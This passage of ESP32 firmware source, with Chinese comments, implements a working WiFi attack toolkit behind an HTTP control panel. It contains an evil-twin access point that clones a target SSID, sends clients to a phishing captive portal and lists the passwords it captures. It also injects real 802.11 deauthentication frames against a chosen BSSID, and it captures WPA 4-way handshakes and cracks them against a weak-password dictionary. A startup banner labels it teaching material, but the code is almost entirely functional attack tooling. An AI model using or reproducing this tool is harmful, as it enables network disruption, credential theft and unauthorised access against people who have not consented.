             ",\"bssid\":\"" + WiFi.BSSIDstr(i) +
             "\",\"auth\":\"" + auth + "\"");
    count++;
  }
  json += "]}";
  WiFi.scanDelete();
  log("[scan] 扫描完成, " + String(count) + " 个 AP");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

static void handleTarget() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");
  sTarget.set = true;
  sTarget.ssid = extractJson(body, "ssid");
  sTarget.bssid = extractJson(body, "bssid");
  sTarget.auth = extractJson(body, "auth");
  sTarget.channel = extractJson(body, "channel").toInt();
  sTarget.rssi = extractJson(body, "rssi").toInt();
  sTarget.ssid.trim();
  sTarget.bssid.trim();
  sTarget.auth.trim();

  // 若双子未设 SSID, 默认跟随主目标
  if (sEvilTwin.cloneSsid.length() == 0) {
    sEvilTwin.cloneSsid = sTarget.ssid;
  }
  sDeauth.targetBssid = sTarget.bssid;
  sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;

  log("[target] 已设置目标: " + (sTarget.ssid.length() ? sTarget.ssid : "(隐藏)") +
      " @ch" + String(sTarget.channel) + " " + sTarget.bssid);
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true}");
}

/* ---------------- 1. 邪恶双子 API ---------------- */
static void handleEvilTwinStart() {
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    String ssid = extractJson(body, "cloneSsid");
    if (ssid.length()) sEvilTwin.cloneSsid = ssid;
  }
  if (sEvilTwin.cloneSsid.length() == 0 && sTarget.ssid.length()) {
    sEvilTwin.cloneSsid = sTarget.ssid;
  }
  sEvilTwin.active = true;
  sEvilTwin.startTime = millis();
  emitLabState("eviltwin", true);
  log("[eviltwin] 邪恶双子实验已启动! 克隆SSID=" + sEvilTwin.cloneSsid + " (Captive Portal 引导至钓鱼验证)");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"active\":true,\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) + "\"}");
}

static void handleEvilTwinStop() {
  sEvilTwin.active = false;
  emitLabState("eviltwin", false);
  log("[eviltwin] 邪恶双子实验已停止");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"active\":false}");
}

static void handleEvilTwinCreds() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json = "{\"credentials\":[";
  uint32_t now = millis();
  for (int i = 0; i < sCredCount; i++) {
    int idx = (sCredHead + 16 - sCredCount + i) % 16;
    if (i) json += ",";
    uint32_t elapsedSec = (now >= sCreds[idx].capturedAt) ? ((now - sCreds[idx].capturedAt) / 1000) : 0;
    String timeStr = (elapsedSec < 3) ? "刚刚" : (String(elapsedSec) + "秒前");
    json += "{\"id\":" + String(sCreds[idx].id) +
            ",\"mac\":\"" + jsonEscape(String(sCreds[idx].mac)) +
            "\",\"pass\":\"" + jsonEscape(String(sCreds[idx].pass)) +
            "\",\"time\":\"" + jsonEscape(timeStr) + "\"}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

static void handleEvilTwinClearCreds() {
  sCredHead = 0;
  sCredCount = 0;
  log("[eviltwin] 捕获凭据已清空");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true}");
}

/* ---------------- 2. 取消认证器 API ---------------- */
static void handleDeauthStart() {
  if (server.hasArg("plain")) {
    String body = server.arg("plain");
    String b = extractJson(body, "bssid");
    if (b.length()) sDeauth.targetBssid = b;
    int ch = extractJson(body, "channel").toInt();
    if (ch > 0) sDeauth.targetChannel = ch;
    int r = extractJson(body, "reason").toInt();
    if (r > 0) sDeauth.reasonCode = r;
    int rate = extractJson(body, "rate").toInt();
    if (rate >= 1 && rate <= 100) sDeauth.rateLimitMs = 1000 / rate;
    if (sDeauth.rateLimitMs == 0) sDeauth.rateLimitMs = 10;
  }
  if (sDeauth.targetBssid.length() == 0 && sTarget.bssid.length()) {
    sDeauth.targetBssid = sTarget.bssid;
    sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
  }
  // 预构 Deauth 管理帧; BSSID 非法则不发送 (只报告, 不再空转计数)
  buildDeauthFrame(sDeauth);
  sDeauth.txOk = false;
  sDeauth.lastTxErr = 0;
  // 信道对齐: 单射频只能在本机信道发帧 → 攻击前把热点临时切到目标信道, 停止时恢复配置信道
  bool channelAligned = false;
  sDeauth.channelMoved = false;
  sDeauth.restoreChannel = apChannelActive;
  if (sDeauth.frameReady && sDeauth.targetChannel != apChannelActive) {
    if (applyApChannel(sDeauth.targetChannel)) {
      sDeauth.channelMoved = true;
      channelAligned = true;
    }
  }
  const bool channelMismatch = (sDeauth.frameReady && sDeauth.targetChannel != apChannelActive);
  sDeauth.running = true;
  sDeauth.frameCount = 0;
  sDeauth.lastTxTime = millis();
  emitLabState("deauth", true);
  log("[deauth] 取消认证器已启动! " + String(sDeauth.frameReady ? "真实帧注入" : "目标 BSSID 无效, 无法注入") +
      " 目标=" + sDeauth.targetBssid + " ch=" + String(sDeauth.targetChannel) + " 原因码=" + String(sDeauth.reasonCode) +
      (channelAligned ? " (已对齐目标: AP 信道切至 ch" + String(apChannelActive) + ", 已连设备将短暂掉线)" : "") +
      (channelMismatch ? " (信道对齐失败: 帧仍只能在 ch" + String(apChannelActive) + " 发出, 目标收不到)" : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              "{\"ok\":true,\"running\":true,\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
              ",\"txChannel\":" + String(apChannelActive) +
              ",\"channelAligned\":" + String(channelAligned ? "true" : "false") +
              ",\"channelMismatch\":" + String(channelMismatch ? "true" : "false") + "}");
}

static void handleDeauthStop() {
  sDeauth.running = false;
  bool channelRestored = false;
  if (sDeauth.channelMoved) {
    channelRestored = applyApChannel(sDeauth.restoreChannel);
    sDeauth.channelMoved = false;
  }
  emitLabState("deauth", false);
  log("[deauth] 取消认证器已停止, 累计发送 " + String(sDeauth.frameCount) + " 帧" +
      (channelRestored ? ", AP 信道已恢复 ch" + String(apChannelActive) : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"running\":false,\"count\":" + String(sDeauth.frameCount) +
              ",\"channelRestored\":" + String(channelRestored ? "true" : "false") +
              ",\"txChannel\":" + String(apChannelActive) + "}");
}

static void handleDeauthStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json = "{";
  json += "\"running\":" + String(sDeauth.running ? "true" : "false") + ",";
  json += "\"count\":" + String(sDeauth.frameCount) + ",";
  json += "\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) + ",";
  json += "\"bssid\":\"" + jsonEscape(sDeauth.targetBssid) + "\",";
  json += "\"channel\":" + String(sDeauth.targetChannel) + ",";
  json += "\"reason\":" + String(sDeauth.reasonCode) + ",";
  json += "\"injected\":" + String(sDeauth.frameReady ? "true" : "false") + ",";
  json += "\"txOk\":" + String(sDeauth.txOk ? "true" : "false") + ",";
  json += "\"txErr\":" + String(sDeauth.lastTxErr) + ",";
  json += "\"txChannel\":" + String(apChannelActive) + ",";
  json += "\"channelMoved\":" + String(sDeauth.channelMoved ? "true" : "false");
  json += "}";
  server.send(200, "application/json", json);
}

/* ---------------- 3. 握手包与密码破解 API ---------------- */
static void handleHandshakeStart() {
  if (!sTarget.set || sTarget.ssid.length() == 0) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json",
                "{\"error\":\"请先扫描并选择目标 AP — 跑包需要它的 SSID 作为 PBKDF2 盐值\"}");
    return;
  }
  uint8_t bssid[6];
  if (!parseBssid(sTarget.bssid, bssid)) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json", "{\"error\":\"目标 BSSID 无效, 请重新选择目标\"}");
    return;
  }

  sHandshake.m1 = sHandshake.m2 = sHandshake.m3 = sHandshake.m4 = false;
  sHandshake.pmkid = false;
  sHandshake.captured = false;
  sHandshake.unsupported = false;
  sHandshake.cracking = false;
  sHandshake.crackedPass = "";
  sHandshake.crackProgress = 0;
  sHandshake.crackAttempts = 0;
  sHandshake.eapolLen = 0;
  sHandshake.frameCount = 0;
  sHandshake.keyver = 2;
  sHandshake.essid = sTarget.ssid;
  memcpy(sHandshake.targetBssid, bssid, 6);
  sHandshake.hasTarget = true;
  sHandshake.captureStartTime = millis();
  sHsLoggedM1 = sHsLoggedM2 = sHsLoggedDone = false;

  // 单射频: 先对齐到目标信道, 再打开 promiscuous 只收数据帧 (EAPOL 走数据帧)
  sHandshake.restoreChannel = apChannelActive;
  const bool needMove = (sTarget.channel > 0 && sTarget.channel != apChannelActive);
  // 注意: 必须先判断 needMove 再切换, 切换后 apChannelActive 已等于目标信道
  sHandshake.channelMoved = needMove && applyApChannel((uint8_t)sTarget.channel);
  const bool channelAligned = !needMove || sHandshake.channelMoved;
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(onEapolFrame);
  const esp_err_t perr = esp_wifi_set_promiscuous(true);
  sHandshake.capturing = (perr == ESP_OK);

  emitLabState("handshake", sHandshake.capturing);
  log(String("[eapol] 开始监听 4-Way Handshake: 目标=") + sTarget.ssid +
      " ch=" + String(apChannelActive) + (sHandshake.capturing ? "" : " (promiscuous 启动失败)"));
  if (!channelAligned) {
    log("[eapol] 警告: 未能切到目标信道 ch" + String(sTarget.channel) + ", 当前仍在 ch" +
        String(apChannelActive) + ", 抓不到该网络的握手帧");
  }
  log("[eapol] 提示: 用 Deauther 让目标客户端重连, 即可在空中抓到 M1/M2");

  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              String("{\"ok\":true,\"capturing\":") + (sHandshake.capturing ? "true" : "false") +
              ",\"channel\":" + String(apChannelActive) +
              ",\"channelAligned\":" + (channelAligned ? "true" : "false") +
              ",\"channelMoved\":" + (sHandshake.channelMoved ? "true" : "false") +
              ",\"essid\":\"" + jsonEscape(sHandshake.essid) + "\"}");
}

static void handleHandshakeStop() {
  stopCaptureEngine();
  sHandshake.cracking = false;
  emitLabState("handshake", false);
  log("[eapol] 停止握手包监听, 累计收到 " + String(sHandshake.frameCount) + " 个 EAPOL-Key 帧" +
      (sHandshake.captured ? ", 已具备跑包条件" : ""));
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              String("{\"ok\":true,\"capturing\":false,\"captured\":") +
              (sHandshake.captured ? "true" : "false") +
              ",\"frames\":" + String(sHandshake.frameCount) + "}");
}

static void handleHandshakeCrack() {
  if (!sHandshake.captured) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json",
                "{\"error\":\"尚未捕获到完整的 M1+M2 — 请先开始监听, 再用 Deauther 触发客户端重连\"}");
    return;
  }
  if (sHandshake.unsupported) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json",
                "{\"error\":\"该网络使用 802.11w PMF (keyver 3), 板载跑包不支持; "
                "请用 /api/handshake/dump 导出后交服务端 /api/wpa/crack\"}");
    return;
  }
  stopCaptureEngine();   // 帧已保存, 跑包期间释放射频监听, 避免与 PBKDF2 抢 CPU
  sHandshake.cracking = true;
  sHandshake.crackProgress = 0;
  sHandshake.crackAttempts = 0;
  sHandshake.crackedPass = "";
  sHandshake.crackStartTime = millis();
  log("[crack] 开始用内置 " + String(sHandshake.crackTotal) + " 条弱口令跑包 (PMK=PBKDF2-HMAC-SHA1 4096 轮) …");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json",
              String("{\"ok\":true,\"cracking\":true,\"total\":") + String(sHandshake.crackTotal) + "}");
}

static void handleHandshakeStatus() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(420);
  json = "{";
  json += "\"capturing\":" + String(sHandshake.capturing ? "true" : "false") + ",";
  json += "\"m1\":" + String(sHandshake.m1 ? "true" : "false") + ",";
  json += "\"m2\":" + String(sHandshake.m2 ? "true" : "false") + ",";
  json += "\"m3\":" + String(sHandshake.m3 ? "true" : "false") + ",";
  json += "\"m4\":" + String(sHandshake.m4 ? "true" : "false") + ",";
  json += "\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") + ",";
  json += "\"captured\":" + String(sHandshake.captured ? "true" : "false") + ",";
  json += "\"unsupported\":" + String(sHandshake.unsupported ? "true" : "false") + ",";
  json += "\"keyver\":" + String(sHandshake.keyver) + ",";
  json += "\"essid\":\"" + jsonEscape(sHandshake.essid) + "\",";
  json += "\"frames\":" + String(sHandshake.frameCount) + ",";
  json += "\"cracking\":" + String(sHandshake.cracking ? "true" : "false") + ",";
  json += "\"progress\":" + String(sHandshake.crackProgress) + ",";
  json += "\"attempts\":" + String(sHandshake.crackAttempts) + ",";
  json += "\"total\":" + String(sHandshake.crackTotal) + ",";
  json += "\"channel\":" + String(apChannelActive) + ",";
  json += "\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\"";
  json += "}";
  server.send(200, "application/json", json);
}

// 导出捕获到的握手材料 (十六进制), 可直接 POST 给服务端 /api/wpa/crack
static void handleHandshakeDump() {
  if (!sHandshake.captured) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(400, "application/json", "{\"error\":\"尚未捕获到完整的 M1+M2\"}");
    return;
  }
  String json;
  json.reserve(1200);
  json = "{\"essid\":\"" + jsonEscape(sHandshake.essid) + "\",";
  json += "\"bssid\":\"" + hexBytes(sHandshake.bssid, 6) + "\",";
  json += "\"stmac\":\"" + hexBytes(sHandshake.stmac, 6) + "\",";
  json += "\"anonce\":\"" + hexBytes(sHandshake.anonce, 32) + "\",";
  json += "\"snonce\":\"" + hexBytes(sHandshake.snonce, 32) + "\",";
  json += "\"keyver\":" + String(sHandshake.keyver) + ",";
  json += "\"mic\":\"" + hexBytes(sHandshake.eapol + 81, 16) + "\",";
  json += "\"eapol\":\"" + hexBytes(sHandshake.eapol, sHandshake.eapolLen) + "\"}";
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", json);
}

static void handleLog() {
  uint32_t since = 0;
  if (server.hasArg("since")) since = (uint32_t)atol(server.arg("since").c_str());
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json;
  json.reserve(2048);
  json = "{\"entries\":[";
  int n = sizeof(sLogs) / sizeof(sLogs[0]);
  int cnt = 0;
  for (int i = n; i > 0; i--) {
    uint8_t idx = (sLogHead + n - i) % n;
    if (sLogs[idx].id == 0 || sLogs[idx].id <= since) continue;
    if (cnt) json += ",";
    json += "{\"id\":" + String(sLogs[idx].id) + ",\"line\":\"" +
            jsonEscape(String(sLogs[idx].line)) + "\"}";
    cnt++;
  }
  json += "]}";
  server.send(200, "application/json", json);
}

/* ---------------- 4. 系统配置与持久化 (NVS Preferences) ---------------- */
static void handleGetConfig() {
  server.sendHeader("Access-Control-Allow-Origin", "*");
  String json = "{";
  json += "\"channel\":" + String(apChannel) + ",";
  json += "\"ssid\":\"" + jsonEscape(apSsid) + "\"";
  json += "}";
  server.send(200, "application/json", json);
}

static void handleConfig() {
  if (!server.hasArg("plain")) {
    server.send(400, "application/json", "{\"error\":\"missing body\"}");
    return;
  }
  String body = server.arg("plain");
  String chStr = extractJson(body, "channel");
  bool changed = false;
  if (chStr.length()) {
    int ch = chStr.toInt();
    if (ch >= 1 && ch <= 13) {
      apChannel = (uint8_t)ch;
      sPrefs.putUChar("channel", apChannel);
      changed = true;
      log("[config] 已更新热点信道配置为 " + String(apChannel) + " (将在重启后生效)");
    }
  }
  String ssidStr = extractJson(body, "ssid");
  if (ssidStr.length() > 0 && ssidStr.length() <= 32) {
    apSsid = ssidStr;
    sPrefs.putString("ssid", apSsid);
    changed = true;
    log("[config] 已更新热点 SSID 为 " + apSsid + " (将在重启后生效)");
  }
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(200, "application/json", "{\"ok\":true,\"changed\":" + String(changed ? "true" : "false") +
              ",\"channel\":" + String(apChannel) + ",\"ssid\":\"" + jsonEscape(apSsid) + "\"}");
}

static void doFactoryReset() {
  log("[admin] 恢复出厂设置 (擦除 NVS 配置) …");
  sPrefs.clear();
  nvs_flash_erase();
  nvs_flash_init();
  server.send(200, "application/json", "{\"ok\":true}");
  delay(1000);
  ESP.restart();
}

static void doReset() {
  log("[admin] 收到重启指令, 1 秒后重启 …");
  server.send(200, "application/json", "{\"ok\":true}");
  delay(1000);
  ESP.restart();
}

static void redirectToAdmin() {
  server.sendHeader("Location", ADMIN_HTML_C);
  server.send(302, "text/plain", "");
}

static void captiveRedirect(const char *type = "text/plain") {
  // 当开启邪恶双子实验时，优先弹出钓鱼验证门户；否则弹出后台管理 (CNA 要求绝对 URI)
  const char *loc = sEvilTwin.active ? "http://192.168.4.1/portal.html" : ADMIN_HTML_C;
  server.sendHeader("Location", loc);
  server.send(302, type, "");
}

static void notFound() {
  if (server.method() == HTTP_OPTIONS) {
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.sendHeader("Access-Control-Allow-Methods", "GET,POST,DELETE,OPTIONS");
    server.sendHeader("Access-Control-Allow-Headers", "Content-Type");
    server.send(204);
    return;
  }
  String uri = server.uri();
  if (uri.startsWith("/api/")) {
    server.send(404, "text/plain", "404 — 未知 API: " + uri);
    return;
  }
  if (uri == "/hotspot-detect.html" || uri == "/library/test/success.html" ||
      uri == "/generate_204" || uri == "/gen_204" ||
      uri == "/connecttest.txt" || uri == "/redirect" || uri == "/ncsi.txt" ||
      uri == "/success.txt" || uri == "/fwlink" || uri == "/") {
    captiveRedirect();
    return;
  }
  captiveRedirect();
}

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println();
  Serial.println("==============================================");
  Serial.println(F("ESP32 无线网络开发固件 v" FW_VERSION " (" FW_BUILD_NS ")"));
  Serial.println(F("无线安全教学与协议验证 · 严禁非法使用"));
  Serial.println("==============================================");

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP_STA);

  sPrefs.begin("esp32-cfg", false);
  apChannel = sPrefs.getUChar("channel", AP_CHANNEL_DEFAULT);
  if (apChannel < 1 || apChannel > 13) apChannel = AP_CHANNEL_DEFAULT;

  uint8_t apMac[6];
  WiFi.softAPmacAddress(apMac);
  String defaultSsid = "WiFi-" + formatMac(apMac).substring(12);
  defaultSsid.replace(":", "");

  String savedSsid = sPrefs.getString("ssid", "");
  apSsid = (savedSsid.length() > 0) ? savedSsid : defaultSsid;

  if (!WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4)) {
    log("[wifi] softAP 启动失败, 将重试 …");
    delay(2000);
    WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4);
  }
  apChannelActive = apChannel;  // 记录开机实际信道 (后续攻击可临时切换, 配置值不变)
  log("[wifi] AP 已启动: SSID=" + apSsid + "  密码=" + AP_PASSWORD + "  信道=" + String(apChannel));
  log("[wifi] 后台: " + String(ADMIN_HTML_C));
  log("[system] 芯片: " + detectChipKey() + "  FreeHeap: " + String(ESP.getFreeHeap()) + " bytes");

  // 上电遥测: 设备身份 (只读)
  emitJson("boot",
           "\"chip\":\"" + jsonEscape(detectChipKey()) +
           "\",\"fw\":\"" FW_VERSION +
           "\",\"ssid\":\"" + jsonEscape(apSsid) +
           "\",\"mac\":\"" + formatMac(apMac) +
           "\",\"channel\":" + String(apChannel));

  server.on("/", HTTP_GET, redirectToAdmin);
  server.on("/admin.html", HTTP_GET, sendAdminPage);
  server.on("/portal.html", HTTP_GET, sendPortalPage);
  server.on("/api/portal/submit", HTTP_POST, handlePortalSubmit);
  server.on("/api/info", HTTP_GET, sendInfo);
  server.on("/api/scan", HTTP_GET, handleScan);
  server.on("/api/target", HTTP_POST, handleTarget);
  server.on("/api/config", HTTP_GET, handleGetConfig);
  server.on("/api/config", HTTP_POST, handleConfig);
  
  // 3 大教学验证板块路由
  server.on("/api/eviltwin/start", HTTP_POST, handleEvilTwinStart);
  server.on("/api/eviltwin/stop", HTTP_POST, handleEvilTwinStop);
  server.on("/api/eviltwin/creds", HTTP_GET, handleEvilTwinCreds);
  server.on("/api/eviltwin/creds", HTTP_DELETE, handleEvilTwinClearCreds);
  
  server.on("/api/deauth/start", HTTP_POST, handleDeauthStart);
  server.on("/api/deauth/stop", HTTP_POST, handleDeauthStop);
  server.on("/api/deauth/status", HTTP_GET, handleDeauthStatus);

  server.on("/api/handshake/start", HTTP_POST, handleHandshakeStart);
  server.on("/api/handshake/stop", HTTP_POST, handleHandshakeStop);
  server.on("/api/handshake/crack", HTTP_POST, handleHandshakeCrack);
  server.on("/api/handshake/status", HTTP_GET, handleHandshakeStatus);
  server.on("/api/handshake/dump", HTTP_GET, handleHandshakeDump);

  server.on("/api/log", HTTP_GET, handleLog);
  server.on("/api/reset", HTTP_POST, doReset);
  server.on("/api/factory-reset", HTTP_POST, doFactoryReset);
  server.onNotFound(notFound);
  server.begin();
  log("[http] 管理后台 HTTP 服务已启动 (80)");

  if (dnsServer.start(DNS_PORT, "*", WiFi.softAPIP())) {
    log("[dns] Captive Portal DNS 已启动 (53, * → 192.168.4.1)");
  } else {
    log("[dns] Captive Portal DNS 启动失败 (后台仍可用, 需手动输地址)");
  }
}

void loop() {
  server.handleClient();
  dnsServer.processNextRequest();

  uint32_t now = millis();

  // 1. 取消认证器定时帧注入推进 (真实 802.11 Deauth 管理帧, 经 AP 接口空口发出)
  if (sDeauth.running) {
    if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
      sDeauth.lastTxTime = now;
      if (sDeauth.frameReady) {
        sDeauth.lastTxErr = esp_wifi_80211_tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
        sDeauth.txOk = (sDeauth.lastTxErr == ESP_OK);
        if (sDeauth.txOk) sDeauth.frameCount++;
      }
    }
    if (now - sDeauth.lastLogTime >= 5000) {
      sDeauth.lastLogTime = now;
      log("[deauth] 正在对目标进行解除认证测试, 已成功发送 " + String(sDeauth.frameCount) + " 帧" +
          (sDeauth.txOk || !sDeauth.frameReady ? "" : (" (最近 TX 错误码 " + String(sDeauth.lastTxErr) + ")")));
    }
  }

  // 2. 握手包捕获进度日志 (真实抓包: 帧由 promiscuous 回调写入状态)
  if (sHandshake.capturing) {
    if (sHandshake.m1 && !sHsLoggedM1) {
      sHsLoggedM1 = true;
      log("[eapol] 捕获 M1: ANonce (AP -> STA)");
    }
    if (sHandshake.m2 && !sHsLoggedM2) {
      sHsLoggedM2 = true;
      log("[eapol] 捕获 M2: SNonce + MIC (STA -> AP)");
    }
    if (sHandshake.captured && !sHsLoggedDone) {
      sHsLoggedDone = true;
      log(String("[eapol] 握手包完整! keyver=") + String(sHandshake.keyver) +
          (sHandshake.pmkid ? " 含 PMKID" : "") +
          (sHandshake.unsupported ? " (PMF, 需交服务端跑包)" : " 可开始跑包"));
    }
  }

  // 3. 弱口令跑包: 每轮主循环只试一条, 保持 HTTP 响应 (单条约 10~30ms PBKDF2)
  if (sHandshake.cracking) {
    if (sHandshake.crackProgress < sHandshake.crackTotal) {
      const char *cand = WIFI_WEAK_DICT[sHandshake.crackProgress];
      uint8_t mic[16];
      sHandshake.crackAttempts++;
      if (computeM2Mic(cand, mic) && memcmp(mic, sHandshake.eapol + 81, 16) == 0) {
        sHandshake.crackedPass = cand;
        sHandshake.cracking = false;
        uint32_t secs = (now - sHandshake.crackStartTime) / 1000;
        log("[crack] 🎉 命中弱口令: " + String(cand) + " (字典第 " + String(sHandshake.crackProgress + 1) +
            " 条, 耗时 " + String(secs) + "s)");
      } else {
        sHandshake.crackProgress++;
        if (sHandshake.crackProgress >= sHandshake.crackTotal) {
          sHandshake.cracking = false;
          log("[crack] 字典跑包完毕, 未匹配到弱口令 (该口令不在内置字典内)");
        } else if ((sHandshake.crackProgress % 500) == 0) {
          log("[crack] 进度 " + String(sHandshake.crackProgress) + "/" + String(sHandshake.crackTotal));
        }
      }
    } else {
      sHandshake.cracking = false;
    }
  }

  // 客户端上下线遥测: 由 softAP 客户端数变化推导 (只读计数)
  static uint8_t lastClients = 0;
  uint8_t clients = WiFi.softAPgetStationNum();
  if (clients > lastClients) {
    emitJson("client_join", "\"clients\":" + String(clients));
  } else if (clients < lastClients) {
    emitJson("client_leave", "\"clients\":" + String(clients));
  }
  lastClients = clients;

  // 心跳: 每 30 秒打印状态 (文本日志 + 结构化遥测各一份)
  static uint32_t lastBeat = 0;
  if (now - lastBeat > 30000) {
    lastBeat = now;
    log("[beacon] " + apSsid + " clients=" + String(clients)
        + "  heap=" + String(ESP.getFreeHeap()) + "  uptime=" + String(now / 1000) + "s");
    emitJson("heartbeat",
             "\"clients\":" + String(clients) +
             ",\"heap\":" + String(ESP.getFreeHeap()) +
             ",\"uptime\":" + String(now / 1000) +
             ",\"minFree\":" + String(ESP.getMinFreeHeap()) +
             ",\"ssid\":\"" + jsonEscape(apSsid) + "\"");
  }
  delay(2);
}
